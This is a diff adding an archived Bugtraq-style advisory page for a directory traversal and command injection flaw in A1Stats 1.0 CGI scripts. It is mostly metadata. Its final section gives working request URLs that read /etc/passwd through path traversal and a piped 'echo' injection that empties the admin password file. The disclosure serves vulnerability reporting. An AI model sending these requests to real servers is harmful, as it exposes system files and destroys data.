@@ -1,0 +1,101 @@
+#SpeeDr00t@Black Falcon<br>#bid2705<p><b><span style="font-size: 18pt;">Drummon Miles A1Stats Directory Traversal Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/2705/info">info</a><br><a href="http://www.securityfocus.com/bid/2705/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/2705/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/2705/solution">solution</a><br><a href="http://www.securityfocus.com/bid/2705/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				2705
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2001-0561<br/>
+				
+					CVE-2001-0562<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 07 2001 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 11 2009 06:06AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Reported to bugtraq by neme-dhc@hushmail.com on May 7, 2001.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Drummond Miles A1Stats 1.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Drummond Miles A1Stats 1.0  (current)<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	(courtesy &amp;lt;neme-dhc@hushmail.com&amp;gt;):<br/><br/>To test these vulnerabilities, try the following.<br/>www.server.com/cgi-bin/a1stats/a1disp3.cgi?../../../../../../../etc/passwd<br/><br/>www.server.com/cgi-bin/a1stats/a1disp4.cgi?../../../../../../../etc/passwd<br/><br/>These two will give you /etc/passwd.<br/><br/>www.server.com/cgi-bin/a1stats/a1disp2.cgi?../../../../../../../etc/passwd<br/><br/>This will also give you /etc/passwd but it will<br/>show it in a very mangled manner as the CGI adds<br/>HTML tags to what it thinks is a file it created<br/>itself.<br/><br/>One can also open a file and wreck its contents.<br/><br/>http://localhost/cgi-bin/a1stats/a1disp.cgi?|echo%20&amp;gt;a1admin.txt|<br/><br/>will empty a1admin.txt. a1admin.txt contains the<br/>password to change settings of the CGI. When this<br/>file is removed, no one can log in anymore.
+	
+		<ul>
+</ul>
+</div>
